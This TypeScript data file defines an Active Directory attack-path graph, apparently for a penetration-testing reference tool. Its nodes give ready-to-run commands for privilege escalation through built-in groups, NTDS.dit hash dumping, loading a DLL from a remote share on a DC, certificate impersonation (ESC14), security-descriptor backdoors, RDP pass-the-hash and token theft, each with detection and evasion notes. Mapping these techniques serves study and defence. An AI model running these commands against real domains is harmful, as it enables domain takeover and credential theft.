import type { AttackEdge, TechniqueNodeDef } from '../schema';

const r = String.raw;
const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

const HT = 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology';
const builtinsRef = { label: 'The Hacker Recipes, Built-in security groups', url: 'https://www.thehacker.recipes/ad/movement/builtins/security-groups' };
const htGroupsRef = { label: 'HackTricks, Privileged Groups & Token Privileges', url: `${HT}/privileged-groups-and-token-privileges.html` };

/**
 * Convergence layer: per-group privilege-escalation nodes that each link into
 * the specific attack path they unlock (e.g. Cert Publishers -> AD CS), plus
 * techniques surfaced from the HackTricks / SpecterOps coverage audit.
 */
export const adConvergenceNodes: TechniqueNodeDef[] = [
  { id: 'ad-cat-priv-groups', label: 'Built-in Privileged Groups', phase: 'priv-esc', kind: 'category', summary: 'Each built-in group unlocks a path to DA.', description: "Membership in one of AD's built-in privileged groups each unlocks a specific escalation: Account Operators, Backup Operators, Server Operators, DnsAdmins, Cert Publishers, and more. Landing in one is often a direct route to Domain Admin." },

  // ── Built-in privileged groups → the attack each one unlocks ─────────────
  {
    id: 'pg-cert-publishers',
    label: 'Cert Publishers',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Write access over CA publication / the NTAuth store, a pivot into AD CS abuse.',
    description:
      "The Cert Publishers group holds write access over the CA's published certificates and the NTAuthCertificates / user-certificate attributes. It is not Domain-Admin-equivalent by itself, but membership is a foothold into the AD CS attack surface: publish a rogue CA into NTAuth, or combine with a template/CA misconfiguration to issue authentication certificates for privileged accounts.",
    tools: [
      { name: 'BloodHound', url: 'https://github.com/SpecterOps/BloodHound' },
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
    ],
    commands: [
      { label: 'Confirm membership & enumerate the PKI', code: r`Get-ADGroupMember 'Cert Publishers'; certipy find -u user@corp.local -p PASS -dc-ip 10.0.0.1 -stdout`, lang: 'powershell' },
    ],
    mitre: mitre('T1078.002'),
    references: [htGroupsRef, builtinsRef],
    requires: ['Membership in Cert Publishers'],
    opsec: 'Writes to the NTAuth/CA store are auditable directory changes; the downstream certificate enrollment + PKINIT logon are the higher-signal events.',
  },
  {
    id: 'pg-backup-operators',
    label: 'Backup Operators',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'SeBackupPrivilege reads any file, so copy the DC NTDS.dit + SYSTEM hive for offline hash extraction.',
    description:
      'Backup Operators hold SeBackupPrivilege (and remote logon to DCs), which bypasses file DACLs. On a Domain Controller, snapshot or back up the locked NTDS.dit and SYSTEM hive, then parse them offline: a DCSync-equivalent dump of every domain secret without replication rights.',
    tools: [
      { name: 'diskshadow / robocopy', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow' },
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (backup_operator)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Back up NTDS.dit + SYSTEM via a shadow copy', code: r`diskshadow /s script.txt   # exposes the volume, then: robocopy /b \\?\GLOBALROOT\...\Windows\NTDS NTDS.dit
reg save HKLM\SYSTEM system.hive`, lang: 'cmd' },
      { label: 'Parse the hives offline', code: r`secretsdump.py -ntds NTDS.dit -system system.hive LOCAL`, lang: 'bash' },
      { label: 'Dump NTDS via SeBackupPrivilege (NetExec, no admin needed)', code: r`nxc smb <dc> -u user -p pass -M backup_operator`, lang: 'bash' },
    ],
    mitre: mitre('T1003.003'),
    references: [htGroupsRef, builtinsRef],
    requires: ['Membership in Backup Operators (with remote access to a DC)'],
    opsec: 'Shadow-copy creation and locked-file reads on a DC are loud (VSS / 4688); quieter than touching LSASS but still monitored.',
  },
  {
    id: 'pg-server-operators',
    label: 'Server Operators',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Reconfigure a DC service binPath to run an attacker command as SYSTEM on the Domain Controller.',
    description:
      'Server Operators can manage services on Domain Controllers. Repoint an existing DC service to an attacker command and restart it. The Service Control Manager runs it as LocalSystem on the DC, which is full domain compromise.',
    tools: [{ name: 'sc.exe', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config' }],
    commands: [
      { label: 'Reconfigure a DC service to add an admin (SYSTEM)', code: r`sc \\dc01 config <service> binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators corp\attacker /add"
sc \\dc01 stop <service> & sc \\dc01 start <service>`, lang: 'cmd' },
    ],
    mitre: mitre('T1543.003'),
    references: [htGroupsRef, builtinsRef],
    requires: ['Membership in Server Operators'],
    opsec: 'Service binary-path changes and restarts on a DC are very high signal (7045/4697 + service-change auditing). Revert the service config.',
  },
  {
    id: 'pg-dnsadmins',
    label: 'DnsAdmins',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Make the DNS service (usually on a DC) load an arbitrary DLL as SYSTEM.',
    description:
      'DnsAdmins can set the ServerLevelPluginDll registry value over RPC; on the next DNS service restart the (DC-hosted) DNS server loads that attacker DLL as LocalSystem, giving code execution as SYSTEM on the Domain Controller.',
    tools: [
      { name: 'dnscmd', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd' },
      { name: 'DNSAdmin-DLL', url: 'https://github.com/kazkansouh/DNSAdmin-DLL' },
    ],
    commands: [
      { label: 'Point the DNS service at an attacker DLL', code: r`dnscmd dc01 /config /serverlevelplugindll \\10.0.0.66\share\evil.dll
sc \\dc01 stop dns & sc \\dc01 start dns`, lang: 'cmd' },
    ],
    mitre: mitre('T1574.001'),
    references: [htGroupsRef, { label: 'labofapenetrationtester, Abusing DNSAdmins', url: 'https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html' }],
    requires: ['Membership in DnsAdmins', 'Ability to restart the DNS service (or wait for a restart)'],
    opsec: 'ServerLevelPluginDll changes + a DNS service restart on a DC are high-signal. Clean up the registry value afterwards.',
  },
  {
    id: 'pg-schema-admins',
    label: 'Schema Admins',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Alter the schema default security descriptor so new objects inherit an attacker ACE domain-wide.',
    description:
      "Schema Admins can modify class schema, including the defaultSecurityDescriptor applied to every newly-created object of a class. Adding an attacker ACE (e.g. GenericAll, or DS-Replication-Get-Changes) makes future objects grant you control: a slow but domain-wide ACL foothold that ultimately enables DCSync / privileged takeover.",
    tools: [{ name: 'PowerView / AD PowerShell', url: 'https://github.com/PowerShellMafia/PowerSploit' }],
    commands: [
      { label: 'Append an ACE to a class default SD (illustrative)', code: r`Set-ADObject -Identity 'CN=User,CN=Schema,CN=Configuration,DC=corp,DC=local' -Replace @{defaultSecurityDescriptor='<existing SDDL>(A;;CCDCLCSWRPWPLOCRRCWDWO;;;<attacker-SID>)'}`, lang: 'powershell' },
    ],
    mitre: mitre('T1222.001'),
    references: [htGroupsRef, builtinsRef],
    requires: ['Membership in Schema Admins (changes require Enterprise Admin approval / schema-master access)'],
    opsec: 'Schema modifications are rare and heavily audited (replicated forest-wide). Effects are delayed (only new objects), so this is a patient persistence/escalation primitive.',
  },
  {
    id: 'pg-account-operators',
    label: 'Account Operators',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Reset passwords and edit most non-protected users & groups, feeding straight into ACL abuse.',
    description:
      'Account Operators can create/modify most users and groups that are not in a protected (AdminSDHolder) group: reset passwords, add members, set SPNs. That control over a wide swathe of principals feeds directly into the DACL/ACL abuse paths (targeted Kerberoast, force-change-password, add-to-group).',
    tools: [{ name: 'net.exe / AD PowerShell', url: 'https://learn.microsoft.com/en-us/powershell/module/activedirectory/' }],
    commands: [
      { label: 'Reset a non-protected user / add to a group', code: r`Set-ADAccountPassword -Identity victim -Reset -NewPassword (ConvertTo-SecureString 'Newp@ss1' -AsPlainText -Force)
net group "Some Group" attacker /add /domain`, lang: 'powershell' },
    ],
    mitre: mitre('T1098.007'),
    references: [htGroupsRef, builtinsRef],
    requires: ['Membership in Account Operators', 'Targets not protected by AdminSDHolder'],
    opsec: 'Password resets (4724) and group changes (4728/4732) are auditable; protected groups (Domain/Enterprise Admins, etc.) are out of reach by design.',
  },

  // ── Coverage gaps from the HackTricks / SpecterOps audit ─────────────────
  {
    id: 'adcs-esc14',
    label: 'ADCS ESC14 (Weak Explicit Cert Mapping)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Abuse altSecurityIdentities explicit mappings to impersonate a privileged account.',
    description:
      "ESC14 abuses explicit certificate-to-account mappings in the altSecurityIdentities attribute, which override the KDC's implicit UPN/SID mapping. With write rights over a target's altSecurityIdentities, add a STRONG explicit mapping (X509IssuerSerialNumber) that references a certificate you can enroll, then PKINIT as the target. A strong mapping is honored even under Full StrongCertificateBindingEnforcement (the 2022 hardening), which is exactly why it bypasses it; the WEAK mapping types (X509SubjectOnly, X509IssuerSubject, X509RFC822) are the ones enforcement blocks, so they only work where enforcement is below Full. A variant abuses a pre-existing weak mapping by setting a victim's mail/cn/dNSHostName to match. altSecurityIdentities is an ordinary directory attribute, written over LDAP/PowerShell, not by Certipy.",
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'PowerView / Set-ADUser (RSAT)', url: 'https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-aduser' },
    ],
    commands: [
      { label: 'Enroll a client-auth cert as a controlled account', code: r`certipy-ad req -u user@corp.local -p PASS -dc-ip 10.0.0.1 -ca CORP-CA -template User`, lang: 'bash' },
      { label: 'Write a STRONG IssuerSerialNumber mapping on the target, pointing at that cert (LDAP/PowerShell, not Certipy)', code: r`Set-ADUser TARGET -Replace @{'altSecurityIdentities'='X509:<I>DC=corp,DC=local,CN=CORP-CA<SR><reversed-serial>'}`, lang: 'powershell' },
      { label: 'Authenticate as the target with the cert (PKINIT) → TGT + NT hash', code: r`certipy-ad auth -pfx user.pfx -username TARGET -domain corp.local -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    mitre: mitre('T1649'),
    references: [
      { label: 'SpecterOps, ADCS ESC14 Abuse Technique', url: 'https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/' },
      { label: 'Microsoft, KB5014754 (strong vs weak certificate mappings)', url: 'https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16' },
      { label: 'Certipy wiki, Privilege Escalation (ESC14)', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
    ],
    requires: ["Write over the target's altSecurityIdentities (or a pre-existing weak mapping + write over a victim's mail/cn/dNSHostName)", 'Enrollment rights on a client-auth template'],
    opsec: 'altSecurityIdentities / victim-attribute writes are auditable (5136) and should be reverted; a STRONG-mapping write is honored even under Full StrongCertificateBindingEnforcement.',
  },
  {
    id: 'security-descriptor-backdoor',
    label: 'Security-Descriptor Backdoors (DAMP)',
    phase: 'persistence',
    needs: 'local-admin',
    summary: 'Edit host security descriptors so a chosen low-priv user keeps remote WMI/WinRM or hash-pull access, with no group membership.',
    description:
      "Instead of adding accounts or touching groups, weaken the discretionary ACLs on a host's remotely-accessible services so an arbitrary trustee retains privileged remote access. SpecterOps' DAMP: Set-RemoteWMI grants remote WMI rights; Set-RemotePSRemoting grants remote PowerShell; Add-RemoteRegBackdoor ACL-backdoors the remote-registry/SAM keys so the chosen user can pull the machine-account hash, local SAM hashes and cached domain creds on demand. On a DC/server this is stealthy, reset-surviving persistence that evades group-membership hunting.",
    tools: [
      { name: 'DAMP (HarmJ0y)', url: 'https://github.com/HarmJ0y/DAMP' },
    ],
    commands: [
      { label: 'Backdoor remote WMI for a chosen user', code: r`Set-RemoteWMI -UserName student1 -ComputerName dc01 -namespace 'root\cimv2' -Verbose`, lang: 'powershell' },
      { label: 'ACL-backdoor remote registry, then pull hashes on demand', code: r`Add-RemoteRegBackdoor -ComputerName dc01 -Trustee student1 -Verbose
Get-RemoteMachineAccountHash -ComputerName dc01 -Verbose`, lang: 'powershell' },
    ],
    mitre: mitre('T1222.001'),
    references: [
      { label: 'HackTricks, Security Descriptors', url: `${HT}/security-descriptors.html` },
      { label: 'SpecterOps, An ACE in the Hole (Host SD modification)', url: 'https://specterops.io/blog/2018/04/10/remote-hash-extraction-on-demand-via-host-security-descriptor-modification/' },
      { label: 'GitHub, HarmJ0y/DAMP', url: 'https://github.com/HarmJ0y/DAMP' },
    ],
    requires: ['Local admin / SYSTEM on the target host (a DC for domain-wide value)'],
    opsec: 'Quiet by design: no new accounts or group changes. The one-time SD modification is the detectable moment; afterward backdoored remote-registry hash pulls look like normal access. Remediation requires auditing/resetting the security descriptors, not password rotation.',
  },
  {
    id: 'rdp-restricted-admin-pth',
    label: 'RDP Restricted Admin Pass-the-Hash',
    phase: 'lateral-movement',
    needs: 'local-admin',
    summary: 'Enable Restricted Admin mode and RDP into a host with only an NT hash, no plaintext.',
    description:
      "Standard RDP needs a plaintext password or Kerberos ticket. Restricted Admin Mode makes the RDP server use a network logon, which enables pass-the-hash over RDP. Set DisableRestrictedAdmin=0 under HKLM\\System\\CurrentControlSet\\Control\\Lsa on the target (remotely if you already have admin), then PtH into the native client with mimikatz sekurlsa::pth /run:'mstsc.exe /restrictedadmin', or use xfreerdp /restricted-admin. As a bonus the session leaves no reusable creds on the remote host.",
    tools: [
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'RestrictedAdmin (GhostPack)', url: 'https://github.com/GhostPack/RestrictedAdmin' },
      { name: 'xfreerdp', url: 'https://github.com/FreeRDP/FreeRDP' },
    ],
    commands: [
      { label: 'Enable Restricted Admin on the target', code: r`reg add "\\TARGET\HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f`, lang: 'cmd' },
      { label: 'PtH into RDP (mimikatz)', code: r`sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NTLM> /run:"mstsc.exe /restrictedadmin"`, lang: 'powershell' },
      { label: 'Or from Linux', code: r`xfreerdp /v:target.corp.local /u:Administrator /pth:<NTLM> /restricted-admin`, lang: 'bash' },
    ],
    mitre: mitre('T1021.001'),
    references: [
      { label: 'HackTricks, RDP Sessions Abuse', url: `${HT}/rdp-sessions-abuse.html` },
      { label: 'GitHub, GhostPack/RestrictedAdmin', url: 'https://github.com/GhostPack/RestrictedAdmin' },
    ],
    requires: ['A target NT hash (or AES key) for an account with RDP/admin rights', 'DisableRestrictedAdmin=0 on the target'],
    opsec: 'Enabling Restricted Admin flips a well-watched registry value (a primary detection); the RDP network logon (4624 type 3) from a tool host is unusual. Defenders enforce DisableRestrictedAdmin=1 by GPO.',
  },
  {
    id: 'koh-token-theft',
    label: 'Koh Token / Credential Theft',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Capture and indefinitely reuse the logon-session tokens of users who connect to a host you control.',
    description:
      "Koh (SpecterOps/GhostPack) abuses token / logon-session leakage to harvest the tokens of any account that authenticates to a machine where you have SYSTEM: RDP, service logons, scheduled tasks. A capture server holds the leaked tokens open (even after logoff) and a client impersonates them on demand. Unlike LSASS dumping, Koh never reads LSASS and yields no password/hash. It reuses live token material, making it both a credential-access primitive and quiet persistence on a high-traffic host (jump box, DC, RDS).",
    tools: [{ name: 'Koh (GhostPack)', url: 'https://github.com/GhostPack/Koh' }],
    commands: [
      { label: 'Start the capture server (as SYSTEM) and list sessions', code: r`Koh.exe capture
Koh.exe list`, lang: 'cmd' },
      { label: 'Impersonate a captured token by LUID', code: r`Koh.exe impersonate <LUID>`, lang: 'cmd' },
    ],
    mitre: mitre('T1134.001'),
    references: [
      { label: 'SpecterOps, Koh: The Token Stealer', url: 'https://specterops.io/blog/2022/07/07/koh-the-token-stealer/' },
      { label: 'GitHub, GhostPack/Koh', url: 'https://github.com/GhostPack/Koh' },
    ],
    requires: ['Local admin / SYSTEM on a host that other (ideally privileged) users authenticate to'],
    opsec: 'Stealthier than LSASS access: no LSASS handle, no hash on disk. The Koh named pipe is an IOC; KB2871997 / TokenLeakDetectDelaySecs and Protected Users membership blunt it. Yields network access as the user, not their cleartext secret.',
  },
  {
    id: 'adws-soapy-enum',
    label: 'ADWS / SoaPy Stealth Enumeration',
    phase: 'enumeration',
    needs: 'domain-user',
    summary: 'Collect AD data over ADWS (TCP 9389) instead of LDAP for far stealthier recon.',
    description:
      'AD Web Services (ADWS) is enabled on every DC since Server 2008 R2 and exposes LDAP-style data over .NET SOAP framing on TCP 9389. Because ADWS proxies queries to local LDAP, collection appears as the DC connecting to itself, and the uncommon binary-SOAP traffic on 9389 is far less inspected than LDAP 389/636. SoaPy re-implements the ADWS stack in pure Python (runs from Linux through a SOCKS proxy) with BOFHound output for direct BloodHound ingestion: the same attack-path graph while dodging LDAP-focused monitoring.',
    tools: [
      { name: 'SoaPy', url: 'https://github.com/logangoins/SOAPy' },
      { name: 'BOFHound', url: 'https://github.com/coffeegist/bofhound' },
    ],
    commands: [
      { label: 'Collect over ADWS via SOCKS (tee the BOFHound-formatted output to a log dir)', code: r`soapy corp.local/user:'PASS'@dc01.corp.local -dn 'DC=corp,DC=local' -q '(objectClass=user)' | tee data/users.log`, lang: 'bash' },
      { label: 'Transform into BloodHound JSON', code: r`bofhound -i data/ -o bloodhound_json/`, lang: 'bash' },
    ],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'SpecterOps, Make Sure to Use SOAP(y)', url: 'https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/' },
      { label: 'GitHub, logangoins/SOAPy', url: 'https://github.com/logangoins/SOAPy' },
    ],
    requires: ['Valid domain credentials', 'TCP 9389 reachable to a DC (often via a SOCKS proxy/foothold)'],
    opsec: 'Quieter than LDAP recon: queries surface as the DC connecting to itself, and 9389 is rarely inspected. One caveat: ADWS is also used by RSAT/ADAC, so it blends with admin traffic but is not invisible.',
  },
];

export const adConvergenceEdges: AttackEdge[] = [
  // Privileged-groups sub-tree (ad-cat-account-abuse -> ad-cat-priv-groups wired in ad-categories.ts)
  { source: 'ad-cat-priv-groups', target: 'pg-cert-publishers' },
  { source: 'ad-cat-priv-groups', target: 'pg-backup-operators' },
  { source: 'ad-cat-priv-groups', target: 'pg-server-operators' },
  { source: 'ad-cat-priv-groups', target: 'pg-dnsadmins' },
  { source: 'ad-cat-priv-groups', target: 'pg-schema-admins' },
  { source: 'ad-cat-priv-groups', target: 'pg-account-operators' },
  // Each group converges into the attack path it unlocks
  { source: 'pg-cert-publishers', target: 'ad-cat-adcs', label: 'PKI write access' },
  { source: 'pg-backup-operators', target: 'ntds-dump', label: 'SeBackup → read NTDS' },
  { source: 'pg-server-operators', target: 'domain-admin', label: 'reconfig DC service → SYSTEM' },
  { source: 'pg-dnsadmins', target: 'domain-admin', label: 'DLL on DC → SYSTEM' },
  { source: 'pg-schema-admins', target: 'ad-cat-dacl', label: 'ACE on future objects' },
  { source: 'pg-account-operators', target: 'ad-cat-dacl', label: 'reset users / add to groups' },

  // Coverage-audit nodes
  { source: 'ad-cat-adcs-template', target: 'adcs-esc14' },
  { source: 'adcs-esc14', target: 'pass-the-certificate', label: 'PKINIT as target' },
  { source: 'ad-cat-persistence', target: 'security-descriptor-backdoor' },
  { source: 'security-descriptor-backdoor', target: 'dcsync', label: 'on-demand hash retrieval' },
  { source: 'ad-cat-lateral', target: 'rdp-restricted-admin-pth' },
  { source: 'rdp-restricted-admin-pth', target: 'dump-lsass', label: 'admin on target' },
  { source: 'ad-cat-host-dump', target: 'koh-token-theft' },
  { source: 'koh-token-theft', target: 'pass-the-ticket', label: 'reuse impersonated token' },
  { source: 'ad-cat-enum', target: 'adws-soapy-enum' },
  { source: 'adws-soapy-enum', target: 'find-privesc-path', label: 'found a path' },
];
